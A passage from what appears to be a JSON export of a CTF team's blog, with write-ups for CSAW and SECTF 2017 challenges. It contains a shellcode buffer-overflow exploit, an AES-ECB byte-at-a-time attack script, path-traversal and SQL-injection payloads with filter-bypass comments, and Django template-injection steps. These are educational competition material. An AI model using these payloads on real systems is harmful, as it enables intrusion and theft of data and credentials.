BUFFER)r.recvuntil('[*]Command:')r.sendline(nops+ shellcode + padding+ p64(BUFFER))r.interactive()r.close() Running it 12345678910111213141516$ python pilot.py[*] '~/ctf/csaw/pwn/pilot' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments[+] Opening connection to pwn.chal.csaw.io on port 8464: Done[*] LEAKED BUFFER 0x7ffc2562d050[*] Switching to interactive mode$ lsflagpilot$ cat flagflag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"pwn","slug":"pwn","permalink":"https://teamrocketist.github.io/tags/pwn/"},{"name":"bufferOverflow","slug":"bufferOverflow","permalink":"https://teamrocketist.github.io/tags/bufferOverflow/"},{"name":"shellcode","slug":"shellcode","permalink":"https://teamrocketist.github.io/tags/shellcode/"}]},{"title":"Crypto-CSAW-CTF-2017-Baby-Crypt","slug":"Crypto-CSAW-CTF-2017-Baby-Crypt","date":"2017-09-18T17:19:10.000Z","updated":"2017-09-19T05:11:05.812Z","comments":true,"path":"2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Baby-Crypt/","excerpt":"","text":"baby_cryptThe cookie is input + flag AES ECB encrypted with the sha256 of the flag as the key.nc crypto.chal.csaw.io 1578 The first step that we took was to find out how many AES 16 byte blocks that the flag has.To measure this we simply sent an empty request to the service. 123DiogoMonteiro @ ~/baby_crypt -&gt; nc crypto.chal.csaw.io 1578Enter your username (no whitespace):Your Cookie is: f9cc1330ae5830732a18d1a23211ffbce3725519adb9e6f10d658d87c80825ed At this stage, and having a hex string with 64 chars, we know that the flag has 32 bytes (including any padding).Therefore, the flag represents two AES 16 byte blocks. From the challenge description we know that the encryption is performed using AES ECB, which is vulnerable to chosen plaintext attacks. As a matter of fact, we have control over the first (any) bytes of the plaintext.With a chosen plaintext attack on AES, to find the 32 bytes of the flag, we need to brute force each one of its bytes, resulting in a search space with size 32 x 94 = 3008 chars, which is easy. The chosen plaintext attack that we performed works as follows. The idea is to input 32 bytes where the last byte is the one that we are going to brute force. We start by sending to the service the input = AAAAAAAAAAAAAAAX (16 chars) for each char X in the range of printable chars, and store the resulting ciphertext of the second block in a dictionary D1. 12345678910(X = byte to brute force, ! = byte of the secret, P = padding byte)| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAAX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!! | for each X in 0x20 to 0x7E| ---------------input ---------------| --------------secret ---------------|D1 = &#123; &apos;cipher(AAAAAAAAAAAAAAAa)&apos;: &apos;a&apos;, &apos;cipher(AAAAAAAAAAAAAAAb)&apos;: &apos;b&apos;, ...&#125; To find the first character of the flag, we compute the ciphertext of the second block with input = AAAAAAAAAAAAAAA (15 chars) and lookup for that ciphertext in the dictionary D1. The next round is similar.For each byte X in the range of printable chars we send input = AAAAAAAAAAAAAAfX (16 chars, and notice the previously found “f” char) to the server and store the resulting ciphertext of the second block in a dictionary D2. 12345678| AAAAAAAAAAAAAAAA | AAAAAAAAAAAAAAfX | !!!!!!!!!!!!!!!! | !!!!!!!!!!!!!!!P || ---------------input ---------------|D2 = &#123; &apos;cipher(AAAAAAAAAAAAAAfa)&apos;: &apos;a&apos;, &apos;cipher(AAAAAAAAAAAAAAfb)&apos;: &apos;b&apos;, ...&#125; Giving input = AAAAAAAAAAAAAAf to the server and looking up in the dictionary D2, we find the second letter of the flag. And so on. The following code implements the attack. 12345678910111213141516171819202122232425262728from pwn import *conn = remote(\"crypto.chal.csaw.io\", 1578)def oracle(chosen): conn.send(chosen + \"\\n\") return conn.recvline().split(\" \")[-1].rstrip(\"\\n\")def second_block(blocks): return blocks[32:64]found = \"\"for j in range(32): d = &#123;&#125; b = (\"A\" * (31-j)) + found for i in range(0x20, 0x7E): chosen = b + chr(i) blocks = oracle(chosen) d[second_block(blocks)] = chr(i) print \".\", n = oracle(\"A\" * (31-j)) found += d[second_block(n)] print foundprint found After running it, we get the flag: 1234567891011121314151617181920212223242526272829303132333435363738..............................................................................................f..............................................................................................fl..............................................................................................fla..............................................................................................flag..............................................................................................flag&#123;..............................................................................................flag&#123;C..............................................................................................flag&#123;Cr..............................................................................................flag&#123;Cry..............................................................................................flag&#123;Cryp..............................................................................................(truncated output)flag&#123;Crypt0_is_s0_h@rd_t0..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0..............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0...............................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0................................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0.................................................................................................flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125;flag&#123;Crypt0_is_s0_h@rd_t0_d0...&#125; Very fun challenge!","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"aes","slug":"aes","permalink":"https://teamrocketist.github.io/tags/aes/"},{"name":"ecb","slug":"ecb","permalink":"https://teamrocketist.github.io/tags/ecb/"}]},{"title":"[Crypto] CSAW 2017 - Another Xor","slug":"Crypto-CSAW-CTF-2017-Another-Xor","date":"2017-09-18T16:46:30.000Z","updated":"2017-09-19T05:11:05.812Z","comments":true,"path":"2017/09/18/Crypto-CSAW-CTF-2017-Another-Xor/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Crypto-CSAW-CTF-2017-Another-Xor/","excerpt":"","text":"Another XorHey, hey can you find my secret.https://ctf.csaw.io/files/ef303796b276cd0bdf4f7c61b2606df5/cipher.pyhttps://ctf.csaw.io/files/02a457c28ec0b04e5f7118e54ac8e138/encrypted Our first attempt to solve this challenge was to use xortool. However, it was a dead end. By looking at the given code we understand the cipher is just xoring with a repeated key. As a consequence, the second try was to perform a known-plaintext attack on recover a part of the key. We know the first bytes of the plaintext, which are “flag{“.We can xor the first 5 bytes of the ciphertext with “flag{“ to get the first 5 bytes of the key. The result is “A qua”. The next step is to find the key length. We know that the last 16 bytes are from a hex encoded md5 hash, so ourstrategy was to try several key lengths while decrypting with the bytes “A qua” that we know. By looking at the partial decrypted values we can find possible key lengths where the resulting chars are printable and the last ones are in hexadecimal. The code used to find the key length was the following: 1234567891011121314151617181920with open(\"encrypted\", \"r\") as f: c = f.read()key = \"A qua\"for j in range(5, 100): keyz = key + (\"&lt;\" * (j - len(key))) print cz = \"\" print \"Trying with keysize of \" + str(len(keyz)) for i in range(len(c)): if keyz[i%len(keyz)] != \"&lt;\": cz += chr(ord(c[i]) ^ ord(keyz[i%len(keyz)])) else: # we still do not have that portion of the key cz += \"?\" print \"plaintext: \" + cz[0:len(cz)-32-len(keyz)] print \"key: \" + cz[len(cz)-32-len(keyz): len(cz)-32] print \"md5: \" + cz[len(cz)-32:] Key-length 67 was one of the few that the last 16 bytes were hex chars. We noticed this: 1234trying with keysize of 67plaintext: flag&#123;?????????????????????????????????key: ????????????????????????????? zinc?????????????????????????????????md5: ?????????????????????????????df2 Lets try with key-length 67.As the ciphertext contains the encryption of the key, it is possible to iteratively find more bytes of the key.This is what implemented to find the flag: 123456789101112131415161718192021with open(\"encrypted\", \"r\") as f: c = f.read()keyz = \"A qua??????????????????????????????????????????????????????????????\"print \"trying with key of length %d\" % len(keyz)while \"?\" in keyz: cz = \"\" for i in range(len(c)): if keyz[i%len(keyz)] != \"?\": cz += chr(ord(c[i]) ^ ord(keyz[i%len(keyz)])) else: cz += \"?\" print \"Partial key --&gt; \" + keyz ak = cz[len(cz)-32-len(keyz): len(cz)-32] keyz = \"A qua\" + ak[5:] # the first 5 bytes we already knowprint \"plaintext: \" + cz[0:len(cz)-32-len(keyz)]print keyz With this, we got the flag: 12345678910111213141516171819202122232425trying with key of length 67Partial key --&gt; A qua??????????????????????????????????????????????????????????????Partial key --&gt; A qua???????????????????????? zinc?????????????????????????????????Partial key --&gt; A qua???????????????????????? zinc????????????????????????ht pa????Partial key --&gt; A qua???????????????ixed ???? zinc????????????????????????ht pa????Partial key --&gt; A qua???????????????ixed ???? zinc???????????????very ????ht pa????Partial key --&gt; A qua?????? of o????ixed ???? zinc???????????????very ????ht pa????Partial key --&gt; A qua?????? of o????ixed ???? zinc?????? make????very ????ht pa????Partial key --&gt; A quart???? of o????ixed ???? zinc?????? make????very ????ht pa????Partial key --&gt; A quart???? of o????ixed ???? zinc o???? make????very ????ht pa????Partial key --&gt; A quart???? of o????ixed ???? zinc o???? make????very ????ht pain??Partial key --&gt; A quart???? of o????ixed wi?? zinc o???? make????very ????ht pain??Partial key --&gt; A quart???? of o????ixed wi?? zinc o???? make????very br??ht pain??Partial key --&gt; A quart???? of oil??ixed wi?? zinc o???? make????very br??ht pain??Partial key --&gt; A quart???? of oil??ixed wi?? zinc o???? makes ??very br??ht pain??Partial key --&gt; A quart j?? of oil??ixed wi?? zinc o???? makes ??very br??ht pain??Partial key --&gt; A quart j?? of oil??ixed wi?? zinc oxi?? makes ??very br??ht pain??Partial key --&gt; A quart j?? of oil??ixed wi?? zinc oxi?? makes ??very br??ht paint|Partial key --&gt; A quart j?? of oil??ixed with zinc oxi?? makes ??very br??ht paint|Partial key --&gt; A quart j?? of oil??ixed with zinc oxi?? makes ??very bright paint|Partial key --&gt; A quart j?? of oil mixed with zinc oxi?? makes ??very bright paint|Partial key --&gt; A quart j?? of oil mixed with zinc oxi?? makes a very bright paint|Partial key --&gt; A quart jar of oil mixed with zinc oxi?? makes a very bright paint|plaintext: flag&#123;sti11_us3_da_x0r_for_my_s3cratz&#125;|A quart jar of oil mixed with zinc oxide makes a very bright paint| Very nice challenge.","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"}]},{"title":"[Web] CSAW - orange v3","slug":"Web-CSAW-orange-v3","date":"2017-09-18T03:48:13.000Z","updated":"2017-09-26T15:32:16.809Z","comments":true,"path":"2017/09/18/Web-CSAW-orange-v3/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v3/","excerpt":"","text":"orange v3I wrote a little proxy program in NodeJS for my poems folder but I’m bad at programming so I had to rewrite it. Again.I changed up flag.txt too but everyone still wants to read it…http://web.chal.csaw.io:7312/?path=orange.txt Keep in mind I didn’t solve this challenge during the CTF but I was pretty close, the way to do this was to use unicode characters, I gave up in mid way after trying alot of characters and gave up and started thinking there was another way of bypassing the new filters! but It didn’t, the reason why I’m doing the writeup is to explain why some approaches don’t work and others do, this write up is based after reading dcua writeup , so all the credits go to them! AnalysisSame problem as orange v1 after testing a bunch of characters and see which ones were giving a 404 error BANNED and now our string must have “.txt“ at the end of the string so we are “stuck” into a one extension: 1r\".|#|%\" # --&gt; if the path GET parameter has any of this characters will return a 404 Note that even null bytes don’t work here because the string must always end with “.txt“. Double url encoding approachDouble url encoding no longer works and why? because the character “%“ is banned, so imagine that we try to inject this %202e the nodejs UrlParse function will decode it first into “%2e“ and the black list filter will block it because it contains a “%2e“! Why are they banning # characterRemember the code from orange v1? 12var path = url.parse(req.url, true).query;path = path['path']; They are using url.parse! url parse in nodejs works the same way that php one works, here what happens when you add # character in php for example: 12345678910111213$ php -r \"var_dump(parse_url('web.chal.csaw.io:7312/?path=hi#.txt'));\"array(5) &#123; [\"host\"]=&gt; string(16) \"web.chal.csaw.io\" [\"port\"]=&gt; int(7312) [\"path\"]=&gt; string(1) \"/\" [\"query\"]=&gt; string(10) \"path=hello\" [\"fragment\"]=&gt; string(4) \".txt\"&#125; You can see the trick? yes if the programmer uses the query parameter he’s fucked! everything after the ‘#’ will go to the field “fragment“! And the string won’t have the “.txt“ in the end of the string! Same thing in nodejs: 123var url = require('url');console.log(url.parse('web.chal.csaw.io:7312/?path=hi#.txt', true).query);// &#123; path: 'hi' &#125; Bypassing the extension filterWell if “#” removes everything after it how do we bypass the extension? well lets do the obvious lets encode “#” 12345678910111213141516$ curl 'web.chal.csaw.io:7312/?path=%23.txt'&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;&lt;html&gt;&lt;title&gt;Directory listing for /poems/&lt;/title&gt;&lt;body&gt;&lt;h2&gt;Directory listing for /poems/&lt;/h2&gt;&lt;hr&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=\"burger.txt\"&gt;burger.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"haiku.txt\"&gt;haiku.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"orange.txt\"&gt;orange.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"ppp.txt\"&gt;ppp.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"the_red_wheelbarrow.txt\"&gt;the_red_wheelbarrow.txt&lt;/a&gt;&lt;/ul&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt; It works! url.parse won’t remove the #, and after this nodejs will make a request at an url, and a GET request ignores everything after a #.Now I will teach another way to bypass this but with another character “?“ or its url encoded version “%3F“: url.parse will do this:123var url = require('url');console.log(url.parse('web.chal.csaw.io:7312/?path=hi?.txt', true).query);// &#123; path: 'hi?.txt' &#125; WTH? if it isn’t the url parse what is happening here? 12345678910var callback = function(response)&#123;var str = '';response.on('data', function (chunk) &#123; str += chunk;&#125;);response.on('end', function () &#123; res.end(str);&#125;);&#125;;http.get(base + path, callback).end(); Yap it’s the http.get function, yes a GET request will ignore everything that is after a ? and this works because this isn’t Local File Inclusion function like include in php but a HTTP REQUEST! amazing isn’t it? Bypassing the “.“ filterEverything else is blocked so the only thing that is left is unicode! You could find all UTF-16 characters at here and the character was this one http://www.fileformat.info/info/unicode/char/012e/index.htm It works! now getting the flag!","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"},{"name":"blackbox","slug":"blackbox","permalink":"https://teamrocketist.github.io/tags/blackbox/"}]},{"title":"[Web] CSAW - orange v1","slug":"Web-CSAW-orange-v1","date":"2017-09-17T23:13:50.000Z","updated":"2017-09-18T00:50:25.306Z","comments":true,"path":"2017/09/18/Web-CSAW-orange-v1/","link":"","permalink":"https://teamrocketist.github.io/2017/09/18/Web-CSAW-orange-v1/","excerpt":"","text":"orange v1I wrote a little proxy program in NodeJS for my poems folder.Everyone wants to read flag.txt but I like it too much to share.http://web.chal.csaw.io:7311/?path=orange.txt We don’t have much here, its just a GET parameter, after a bunch of tries we realized that “..” characters are banned, so lets try with double encoding: 1234567891011121314151617$ curl 'http://web.chal.csaw.io:7311/?path=%252e%252e/'&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;&lt;html&gt;&lt;title&gt;Directory listing for /poems/../&lt;/title&gt;&lt;body&gt;&lt;h2&gt;Directory listing for /poems/../&lt;/h2&gt;&lt;hr&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=\".dockerignore\"&gt;.dockerignore&lt;/a&gt;&lt;li&gt;&lt;a href=\"back.py\"&gt;back.py&lt;/a&gt;&lt;li&gt;&lt;a href=\"flag.txt\"&gt;flag.txt&lt;/a&gt;&lt;li&gt;&lt;a href=\"poems/\"&gt;poems/&lt;/a&gt;&lt;li&gt;&lt;a href=\"serve.sh\"&gt;serve.sh&lt;/a&gt;&lt;li&gt;&lt;a href=\"server.js\"&gt;server.js&lt;/a&gt;&lt;/ul&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt; And there it is the flag! 12$ curl 'http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt'flag&#123;thank_you_based_orange_for_this_ctf_challenge&#125; Since we could leak the source code here ill post it:123456789101112131415161718192021222324252627282930var http = require('http');var fs = require('fs');var url = require('url');var server = http.createServer(function(req, res) &#123; try &#123; var path = url.parse(req.url, true).query; path = path['path']; if (path.indexOf(\"..\") == -1 &amp;&amp; path.indexOf(\"ＮＮ\") == -1) &#123; var base = \"http://localhost:8080/poems/\"; var callback = function(response)&#123; var str = ''; response.on('data', function (chunk) &#123; str += chunk; &#125;); response.on('end', function () &#123; res.end(str); &#125;); &#125; http.get(base + path, callback).end(); &#125; else &#123; res.writeHead(403); res.end(\"WHOA THATS BANNED!!!!\"); &#125; &#125; catch (e) &#123; res.writeHead(404); res.end('Oops'); &#125;&#125;);","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"csaw","slug":"csaw","permalink":"https://teamrocketist.github.io/tags/csaw/"},{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"lfi","slug":"lfi","permalink":"https://teamrocketist.github.io/tags/lfi/"}]},{"title":"[Web] CSAW - Shia Labeouf-off","slug":"Web-CSAW-Shia-Labeouf-off","date":"2017-09-17T21:27:02.000Z","updated":"2017-09-25T05:07:04.332Z","comments":true,"path":"2017/09/17/Web-CSAW-Shia-Labeouf-off/","link":"","permalink":"https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/","excerpt":"","text":"WebShia Labeouf-off!Do itJust do itDon’t let your dreams be dreamsYesterday you said tomorrowSo just do itMake your dreams come trueJust do itPick 1: http://web.chal.csaw.io:5487 http://web.chal.csaw.io:5488 http://web.chal.csaw.io:5489 http://web.chal.csaw.io:5490 First of all great shout outs to CSAW for publishing a django challenge, even if it wasn’t a very hard one it was fun to do it.Now going to the challenge, we know we have django debug mode enabled so lets try to generate some errors in the available webpages to see if we can leak some source code for example if we give an id in polls url we generate an exception: If we scroll down a little bit and check those hidden tabs, we can find some leaked source code! We have some nice custom made template filter tags! in django you can create custom tags and use it on templates, we have a function that lists the attributes(listme) of a python object one that gets attributes(getme): 1234567891011121314@register.filter(name='getme')def getme(value, arg): return getattr(value, arg)@register.filter(name='checknum')def checknum(value): check(value)@register.filter(name='listme')def listme(value): return dir(value)def check(value): if value &gt; 2: raise Exception(\"Our infrastructure can't support that many Shias!\") Now we need to find a Server-Side Template Injection (SSTI) so we can use this useful filters we can inject code with: 12&#123;% expressions %&#125;&#123;&#123; arg1|filter:arg2 &#125;&#125; we can find one at http://web.chal.csaw.io:5490/ad-lib/ lets try to see the contents of debug variable: Query Results Yap it works! the global debug leak alot of variables, mrpoopy object is interesting! lets check its attributes with the filter listme Query Response The flag must be in flag!! we need now to get this attribute with getme filter! Query Response","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"pythonserver","slug":"pythonserver","permalink":"https://teamrocketist.github.io/tags/pythonserver/"},{"name":"ssti","slug":"ssti","permalink":"https://teamrocketist.github.io/tags/ssti/"},{"name":"django","slug":"django","permalink":"https://teamrocketist.github.io/tags/django/"}]},{"title":"[Web] SECTF - Sprinkler system","slug":"Web-SECTF-Sprinkler-system","date":"2017-09-15T19:36:03.000Z","updated":"2017-09-15T19:47:05.449Z","comments":true,"path":"2017/09/15/Web-SECTF-Sprinkler-system/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/","excerpt":"","text":"Sprinkler system - Web (100 + 0)Damn new york… some chick tricked you into standing in the rain on the very first day… it’s payback time!Solves: 238Service: http://sprinklers.alieni.se/Author: avlidienbrunn Starting by looking into robots.txt 123curl 'http://sprinklers.alieni.se/robots.txt'User-agent: *Disallow: /cgi-bin/test-cgi We have a hidden directory /cgi-bin/test-cgi, my first instinct was to try shellshock but ofcourse it didn’t work so after a while searching in google I found this http://insecure.org/sploits/test-cgi.server_protocol.html. To list the root directory we can do this:12345678910111213141516171819202122curl 'http://sprinklers.alieni.se/cgi-bin/test-cgi?/*'CGI/1.0 test script report:argc is 1. argv is /\\*.SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)SERVER_NAME = sprinklers.alieni.seGATEWAY_INTERFACE = CGI/1.1SERVER_PROTOCOL = HTTP/1.1SERVER_PORT = 80REQUEST_METHOD = GETHTTP_ACCEPT = */*PATH_INFO = PATH_TRANSLATED = SCRIPT_NAME = /cgi-bin/test-cgiQUERY_STRING = /app /bin /boot /dev /etc /git /home /lib /lib64 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /varREMOTE_HOST =REMOTE_ADDR = 172.68.102.79REMOTE_USER =AUTH_TYPE =CONTENT_TYPE =CONTENT_LENGTH = Nothing special on the root directory lets try to list the current directory to instead of doing ?/ lets try ? at the end of the url: 12345678910111213141516171819202122$ curl 'http://sprinklers.alieni.se/cgi-bin/test-cgi?*'CGI/1.0 test script report:argc is 1. argv is \\*.SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)SERVER_NAME = sprinklers.alieni.seGATEWAY_INTERFACE = CGI/1.1SERVER_PROTOCOL = HTTP/1.1SERVER_PORT = 80REQUEST_METHOD = GETHTTP_ACCEPT = */*PATH_INFO = PATH_TRANSLATED = SCRIPT_NAME = /cgi-bin/test-cgiQUERY_STRING = enable_sprinkler_system test-cgiREMOTE_HOST =REMOTE_ADDR = 172.68.102.79REMOTE_USER =AUTH_TYPE =CONTENT_TYPE =CONTENT_LENGTH It works! there is a file named enable_sprinkler_system! lets see what is its content:","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"cgi","slug":"cgi","permalink":"https://teamrocketist.github.io/tags/cgi/"},{"name":"directorylisting","slug":"directorylisting","permalink":"https://teamrocketist.github.io/tags/directorylisting/"}]},{"title":"[Misc] SECTF - Joeys screenshot","slug":"Misc-SECTF-Joeys-screenshot","date":"2017-09-15T19:17:28.000Z","updated":"2017-09-15T19:32:12.930Z","comments":true,"path":"2017/09/15/Misc-SECTF-Joeys-screenshot/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Misc-SECTF-Joeys-screenshot/","excerpt":"","text":"Joeys screenshot - Misc (50 + 0)Joey gave me this screenshot to prove he got into The Gibson. Can you help us hack The Gibson too?Solves: 69Download: http://dl.ctf.rocks/joey.tar.gzAuthor: SecureLink / klondike Pretty simple one, this image had some strange hidden comments, I extracted them using https://github.com/zed-0xff/zsteg: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142$ zsteg chall.pngmeta Comment .. 00000000: 5f 33 36 |_36 |meta Comment .. 00000000: 33 32 37 |327 |meta Comment .. 00000000: 43 32 |C2 |meta Comment .. 00000000: 31 33 34 |134 |meta Comment .. 00000000: 35 32 34 |524 |meta Comment .. 00000000: 4e 32 32 |N22 |meta Comment .. 00000000: 48 34 31 |H41 |meta Comment .. 00000000: 7b 34 |&#123;4 |meta Comment .. 00000000: 5f 31 31 |_11 |meta Comment .. 00000000: 5f 33 33 |_33 |meta Comment .. 00000000: 5f 31 33 |_13 |meta Comment .. 00000000: 30 32 31 |021 |meta Comment .. 00000000: 45 31 |E1 |meta Comment .. 00000000: 35 33 30 |530 |meta Comment .. 00000000: 33 34 32 |342 |meta Comment .. 00000000: 48 34 33 |H43 |meta Comment .. 00000000: 30 33 38 |038 |meta Comment .. 00000000: 35 33 35 |535 |meta Comment .. 00000000: 50 32 36 |P26 |meta Comment .. 00000000: 55 32 35 |U25 |meta Comment .. 00000000: 47 33 37 |G37 |meta Comment .. 00000000: 34 31 35 |415 |meta Comment .. 00000000: 33 39 |39 |meta Comment .. 00000000: 42 31 39 |B19 |meta Comment .. 00000000: 53 30 |S0 |meta Comment .. 00000000: 55 32 39 |U29 |meta Comment .. 00000000: 52 32 38 |R28 |meta Comment .. 00000000: 52 33 32 |R32 |meta Comment .. 00000000: 44 31 34 |D14 |meta Comment .. 00000000: 32 31 32 |212 |meta Comment .. 00000000: 5f 32 33 |_23 |meta Comment .. 00000000: 44 35 |D5 |meta Comment .. 00000000: 44 33 39 |D39 |meta Comment .. 00000000: 5f 34 30 |_40 |meta Comment .. 00000000: 47 31 37 |G17 |meta Comment .. 00000000: 4b 38 |K8 |meta Comment .. 00000000: 59 31 30 |Y10 |meta Comment .. 00000000: 33 34 34 |344 |meta Comment .. 00000000: 21 34 35 |!45 |meta Comment .. 00000000: 35 32 30 |520 |meta Comment .. 00000000: 54 33 |T3 |meta Comment .. 00000000: 33 33 31 |331 |meta Comment .. 00000000: 31 31 38 |118 |meta Comment .. 00000000: 34 36 |46 |meta Comment .. 00000000: 7d 34 36 |&#125;46 |meta Comment .. 00000000: 5f 31 36 |_16 |meta Comment .. 00000000: 5f 37 |_7 | After extracting them into a file I noticed the pattern behind it! if we get some comments we can see something familiar! 12345S0E1C2T3&#123;4 Yes! the first letter is a character from the flag and the order is the number after it! so lets write a python script to parse this and construct the flag! 123456789d = &#123;&#125;flag = ''with open('notes.txt', 'r') as f: l = f.read().split() for s in l: d[s[1:]] = s[0]for x in xrange(47): flag += d[str(x)]print flag A now running it 12$ python misc50.py SECT&#123;D4_K3Y_2_D4_G1B50N_5UP3RU53R_15_G0D_H3H3!&#125;","categories":[{"name":"Misc","slug":"Misc","permalink":"https://teamrocketist.github.io/categories/Misc/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://teamrocketist.github.io/tags/misc/"},{"name":"stego","slug":"stego","permalink":"https://teamrocketist.github.io/tags/stego/"},{"name":"zsteg","slug":"zsteg","permalink":"https://teamrocketist.github.io/tags/zsteg/"},{"name":"comments","slug":"comments","permalink":"https://teamrocketist.github.io/tags/comments/"},{"name":"puzzle","slug":"puzzle","permalink":"https://teamrocketist.github.io/tags/puzzle/"}]},{"title":"[Web] SECTF - naughtyads","slug":"Web-SECTF-naughtyads","date":"2017-09-15T16:10:27.000Z","updated":"2017-09-15T16:47:39.463Z","comments":true,"path":"2017/09/15/Web-SECTF-naughtyads/","link":"","permalink":"https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/","excerpt":"","text":"Naughty ads - Web (200 + 0)Can you put agent Gill in the naughty ad section? His phone number is “555-31338”Solves: 122Service: http://naughtyads.alieni.se/Author: avlidienbrunn Checking in robots.txt we have a hidden directory called admin, but there is a http authentication and we don’t know the user and the password, we need to find a vulnerability to get the credentials. Finding the vulnerabilityAnother Sql injection after some searching I found a GET param vulnerable to blind SQLi Successful query that returns content : 1http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='A Unsuccessful query that returns nothing : 1http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='B Bypassing filtersNow there is some kind of protection, there is a filter blacklisting alot of SQL words, one way of bypassing it is by doing this: 12// bypasses or filterhttp://naughtyads.alieni.se?id=3ad3-46c3-b975' /*!50000or*/ 1 AND 'A'='A Performing Union InjectionsGetting Table names: 1http://naughtyads.alieni.se/?id=3ad3-46c3-b97' /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(table_name) /*!50000from*/ information_schema.tables /*!50000where*/ table_schema=database() AND '1'='1 Getting Columns names: 1http://naughtyads.alieni.se/?id=3ad3-46c3-b97' /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(column_name) /*!50000from*/ information_schema.columns /*!50000where*/ table_schema=database() AND '1'='1 Getting the Username and password 1http://naughtyads.alieni.se/?id=3ad3-46c3-b97' /*!50000union*/ /*!50000all*/ /*!50000select*/ group_concat(name, \" \", password) /*!50000from*/ login /*!50000where*/ '1'='1 After searching in google the hash 5ebe2294ecd0e0f08eab7690d2a6ee69 is secret Admin LoginWe have a simple form with a image upload well if we remember the challenge description: 1Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot; So lets put the number and submit the form: 12$ curl 'http://naughtyads.alieni.se/admin/' --user webmasterofdoom3755:secret --data 'phone=555-31338'SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125; And we got the flag!!!","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"blindsqli","slug":"blindsqli","permalink":"https://teamrocketist.github.io/tags/blindsqli/"},{"name":"filterbypass","slug":"filterbypass","permalink":"https://teamrocketist.github.io/tags/filterbypass/"},{"name":"sqlinjection","slug":"sqlinjection","permalink":"https://teamrocketist.github.io/tags/sqlinjection/"},{"name":"httpauth","slug":"httpauth","permalink":"https://teamrocketist.github.io/tags/httpauth/"}]},{"title":"[Pwn] SECTF - Jail 